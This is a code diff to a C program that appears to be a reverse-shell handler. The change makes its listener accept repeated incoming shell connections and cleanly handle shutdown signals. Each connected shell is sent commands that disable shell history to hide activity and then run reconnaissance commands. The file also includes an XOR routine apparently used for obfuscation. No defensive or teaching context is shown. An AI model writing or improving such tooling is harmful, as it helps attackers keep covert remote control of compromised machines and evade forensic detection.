@@ -24,6 +24,8 @@
 
 #define INIT	"unset HISTFILE; unset SAVEHIST; uname -a; id; echo; export TERM=linux;\n"
 
+int sockfd;
+
 char good[] = "\e[01;34m[\e[00m+\e[01;34m]\e[00m";
 char bad[] = "\e[01;31m[\e[00m-\e[01;31m]\e[00m";
 char warn[] = "\e[01;33m[\e[00m!\e[01;33m]\e[00m";
@@ -96,14 +98,24 @@ void shell(int fd) {
     }
 }
 
+void handle_shutdown(int signal){
+	close(sockfd);
+	exit(0);
+}
+
 void listener(int port) {
-	int sockfd, new_sockfd, rec;  
+	int new_sockfd, rec;  
 	struct sockaddr_in host_addr, client_addr;
 	socklen_t sin_size;
 	char buff[256];
 
 	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) fatal("in socket");
 
+	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) fatal("setting socket option SO_REUSEADDR");
+
+	signal(SIGTERM, handle_shutdown);
+	signal(SIGINT, handle_shutdown);
+	
 	host_addr.sin_family = AF_INET;		
 	host_addr.sin_port = htons(port);	        
 	host_addr.sin_addr.s_addr = INADDR_ANY; 
@@ -117,27 +129,28 @@ void listener(int port) {
 		printf("%s Listening on port %d...\n", good, port);
 	}
 
-	sin_size = sizeof(struct sockaddr_in);
-	new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
+	while(1) {
+		sin_size = sizeof(struct sockaddr_in);
+		new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
 	
-	if(new_sockfd == -1) fatal("accepting connection");
+		if(new_sockfd == -1) fatal("accepting connection");
 
-	printf("%s Connection from %s:%d...", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
+		printf("%s Connection from %s:%d...", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
 		
-	rec = read(new_sockfd, buff, 256);
+		rec = read(new_sockfd, buff, 256);
 
-	if(checkshell(new_sockfd) == -1) {
-		fatal("reverse shell not opened");
-	} else {
-		printf(" Shell is opened!\n\n");
-	}
+		if(checkshell(new_sockfd) == -1) {
+			fatal("reverse shell not opened");
+		} else {
+			printf(" Shell is opened!\n\n");
+		}
 
-	if(rec > 0) fprintf(stdout, "%s", buff); 
+		if(rec > 0) fprintf(stdout, "%s", buff); 
 	
-        send(new_sockfd, INIT, strlen(INIT), 0);
-	shell(new_sockfd);
-	close(new_sockfd);
-	close(sockfd);
+        	send(new_sockfd, INIT, strlen(INIT), 0);
+		shell(new_sockfd);
+		shutdown(new_sockfd, SHUT_RDWR);
+	}
 }
 
 void s_xor(char *arg, int key, int nbytes) {
